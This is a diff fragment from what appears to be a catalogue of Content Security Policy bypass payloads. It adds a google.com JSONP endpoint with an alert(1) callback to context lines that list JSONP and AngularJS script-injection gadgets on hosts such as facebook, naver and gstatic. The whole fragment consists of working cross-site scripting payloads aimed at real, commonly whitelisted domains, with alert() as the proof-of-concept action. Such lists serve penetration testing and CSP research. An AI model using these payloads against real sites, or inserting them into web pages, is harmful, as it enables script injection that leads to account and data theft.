@@ -94,6 +94,7 @@ gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c4
 global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>
 go.dev	<script src="https://go.dev/blog/.json?jsonp=alert"></script>
 go.snyk.io	<script src="https://go.snyk.io/index.php/form/getForm?munchkinId=677-THP-415&form=1461&callback=alert"></script>
+google.com  <script src="https://google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
 graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>
 gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
